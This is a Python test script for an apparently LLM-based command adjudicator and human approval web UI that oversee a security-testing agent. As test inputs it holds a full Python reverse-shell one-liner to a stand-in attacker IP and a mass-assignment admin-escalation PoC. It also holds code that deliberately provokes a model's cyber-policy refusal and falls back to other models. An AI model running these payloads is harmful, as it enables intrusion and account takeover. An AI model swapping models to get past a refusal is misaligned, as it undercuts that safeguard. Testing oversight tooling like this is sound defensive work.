#!/usr/bin/env python3
"""FR-13/14: プロバイダ拒否(cyber_policy)検知とフォールバックの実APIテスト。
FR-24: Web UI の承認フロー(ask→承認/拒否)の実サーバテスト。
"""
import json
import os
import sys
import time
import urllib.request

REPO = "/home/yusuk/blackbox-testing/strix_guard"
sys.path.insert(0, REPO)

from strix_guard.adjudicator import Adjudicator  # noqa: E402
from strix_guard.decision import load_api_key   # noqa: E402
from strix_guard.policy import RiskVector, PolicyDecision, Verdict  # noqa: E402

results = []


def rec(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"[{'PASS' if ok else 'FAIL'}] {name} {detail}", flush=True)


# ---------- FR-13/14: 実APIでのプロバイダ拒否→フォールバック ----------
key = load_api_key()
rec("APIキー取得", bool(key), "from ~/.strix/cli-config.json" if key else "missing")
if key:
    adj = Adjudicator(key, model="openai/gpt-6-sol",
                      fallback_models=["google/gemini-3.8-flash", "anthropic/claude-opus-4.6"],
                      max_calls=10, max_cost_usd=1.0)
    risk = RiskVector(destructiveness=0.9, load=0.1, data_exposure=0.9,
                      scope_violation=0.1, third_party=0.2,
                      sufficiency="sufficient", facts={}, source="jev")
    dec = PolicyDecision(verdict=Verdict.REVISE, reasons=["destructiveness"], constraints={})
    cmd = ("python3 -c \"import socket,subprocess,os; s=socket.socket(); "
           "s.connect(('203.0.113.7',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); "
           "os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])\" "
           "# reverse shell to attacker host for persistence")
    t0 = time.time()
    out = adj.adjudicate(cmd=cmd, script_content=None, risk=risk, decision=dec,
                         context={"environment": "benchmark",
                                  "allowed_test_accounts": ["alice", "bob"]})
    dt = time.time() - t0
    print("first adjudication:", json.dumps(out, ensure_ascii=False)[:200] if out else None,
          "last_error=", getattr(adj, "last_error", None), flush=True)

    # FR-13: プロバイダ拒否(cyber_policy)を誘発しやすい mass-assignment PoC を脚本として渡す
    script = """import requests
# PoC: privilege escalation via mass assignment (registered users endpoint)
for uid in range(1, 50):
    r = requests.put('http://target/api/users/%d' % uid,
                     json={'role': 'admin', 'is_admin': True},
                     headers={'Authorization': 'Bearer leaked-token'})
    if r.status_code == 200:
        print('escalated', uid)
"""
    t0 = time.time()
    out2 = adj.adjudicate(cmd="python3 /workspace/poc.py", script_content=script,
                          risk=risk, decision=dec,
                          context={"environment": "benchmark",
                                   "allowed_test_accounts": ["alice", "bob"]})
    dt = time.time() - t0
    print("second adjudication:", json.dumps(out2, ensure_ascii=False)[:200] if out2 else None,
          "last_error=", getattr(adj, "last_error", None), "calls=", adj.calls,
          f"({dt:.1f}s)", flush=True)
    if out2:
        rec("FR-13/14 裁定継続(拒否時はフォールバック)", True,
            f"model={out2.get('model')} fallback={out2.get('fallback')} action={out2.get('action')}")
    else:
        rec("FR-13 全モデル失敗→fail-closed(None)", adj.last_error is not None,
            f"last_error={getattr(adj, 'last_error', '')[:160]}")
    if out:
        rec("FR-14 裁定応答あり(1次)", True,
            f"model={out.get('model')} action={out.get('action')} calls={adj.calls} ({dt:.1f}s)")
    else:
        rec("FR-14 1次モデル失敗(拒否/エラー)", adj.last_error is not None,
            f"last_error={getattr(adj, 'last_error', '')[:200]}")

# ---------- FR-24: Web UI 承認フロー ----------
from strix_guard.webui import ApprovalBroker, WebApprovalServer  # noqa: E402
from strix_guard import webui as W  # noqa: E402

broker = ApprovalBroker(timeout_s=10)
srv = WebApprovalServer(broker, lang="ja").start()
url = srv.url()
print("web ui:", url)

# 承認スレッド: broker.request は ask を投げて返答を待つ
import threading

def asker():
    d = broker.request({"cmd": "curl http://target/?ask=1", "card": {"title": "test"}},
                       timeout_s=10)
    ASK_RESULT.append(d)

ASK_RESULT = []
th = threading.Thread(target=asker, daemon=True)
th.start()
time.sleep(0.5)
snaps = broker.snapshot()
ok_page = False
try:
    with urllib.request.urlopen(url) as r:
        html = r.read().decode()
    ok_page = "strix-guard" in html and 'lang="ja"' in html
except Exception as e:
    print("page fetch error:", e)
rec("FR-24 Web UI ページ表示(ja)", ok_page, url)
rec("FR-24 承認待ちがsnapshotに現れる", len(snaps) == 1, f"pending={len(snaps)}")

pid = snaps[0]["id"]
token = url.split("t=")[1]
# 拒否して応答
req = urllib.request.Request(
    url.split("?")[0] + "/api/decide?t=" + token,
    data=json.dumps({"id": pid, "action": "deny", "message": "no"}).encode(),
    headers={"Content-Type": "application/json"})
with urllib.request.urlopen(req) as r:
    body = json.loads(r.read())
rec("FR-24 /api/decide で拒否反映", body.get("ok") is True, json.dumps(body)[:100])
th.join(timeout=12)
rec("FR-24 ask側がdenyを受け取る",
    bool(ASK_RESULT) and ASK_RESULT[0].get("action") == "deny",
    str(ASK_RESULT[:1])[:120])

# 承認シナリオ
ASK_RESULT2 = []
th2 = threading.Thread(target=lambda: ASK_RESULT2.append(
    broker.request({"cmd": "curl http://target/?ask=2"}, timeout_s=10)), daemon=True)
th2.start()
time.sleep(0.5)
snaps = broker.snapshot()
pid2 = snaps[0]["id"]
req = urllib.request.Request(
    url.split("?")[0] + "/api/decide?t=" + token,
    data=json.dumps({"id": pid2, "action": "allow", "message": "ok"}).encode(),
    headers={"Content-Type": "application/json"})
with urllib.request.urlopen(req) as r:
    body = json.loads(r.read())
th2.join(timeout=12)
rec("FR-24 Web UI 承認(allow→allow)",
    bool(ASK_RESULT2) and ASK_RESULT2[0].get("action") == "allow",
    f"resp={json.dumps(body)[:60]} result={str(ASK_RESULT2[:1])[:80]}")
srv.stop()
